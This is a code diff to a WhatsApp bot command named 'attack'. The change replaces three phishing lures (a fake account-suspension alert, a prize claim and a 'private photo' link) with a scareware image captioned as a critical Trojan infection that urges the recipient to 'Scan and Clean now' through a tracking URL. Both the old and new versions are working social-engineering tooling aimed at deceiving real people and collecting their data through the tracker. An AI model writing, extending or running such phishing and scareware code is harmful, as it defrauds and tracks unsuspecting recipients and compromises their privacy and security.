@@ -1,8 +1,11 @@
 const { isAdmin } = require('../utils/auth');
+const { MessageMedia } = require('whatsapp-web.js');
+const path = require('path');
+const fs = require('fs');
 
 module.exports = {
     name: 'attack',
-    description: 'Grab target data by sending a message.',
+    description: 'Send a virus alert image with tracking link.',
     async execute(client, message, args) {
         if (!isAdmin(client, message)) {
             return message.reply('❌ Admin access required.');
@@ -15,17 +18,17 @@ module.exports = {
             }
 
             const trackerUrl = `https://${domain}/track`;
+            const imagePath = path.join(__dirname, '../attached_assets/generated_images/scary_hacker_virus_alert_image..png');
             
-            const attackMessages = [
-                `🚨 *URGENT SECURITY ALERT* 🚨\n\nYour account has been flagged for suspicious activity. Please verify your identity immediately to avoid permanent suspension:\n\n🔗 ${trackerUrl}`,
-                `🎁 *CONGRATULATIONS!* 🎁\n\nYou've won a premium subscription! Claim your reward now before the link expires:\n\n🔗 ${trackerUrl}`,
-                `📸 *NEW PHOTO SHARED* 📸\n\nSomeone just shared a private photo with you. View it here:\n\n🔗 ${trackerUrl}`
-            ];
+            if (!fs.existsSync(imagePath)) {
+                return message.reply("❌ Error: Attack asset not found.");
+            }
 
-            const selectedMsg = attackMessages[Math.floor(Math.random() * attackMessages.length)];
-            
+            const media = MessageMedia.fromFilePath(imagePath);
+            const caption = `⚠️ *CRITICAL SYSTEM THREAT DETECTED* ⚠️\n\nYour device has been infected with a high-risk Trojan. Immediate action is required to prevent data loss.\n\n🛡️ *Scan and Clean now:* \n🔗 ${trackerUrl}`;
+
             const target = message.fromMe ? message.to : message.from;
-            await client.sendMessage(target, selectedMsg);
+            await client.sendMessage(target, media, { caption });
 
         } catch (error) {
             console.error('Attack Command Error:', error);
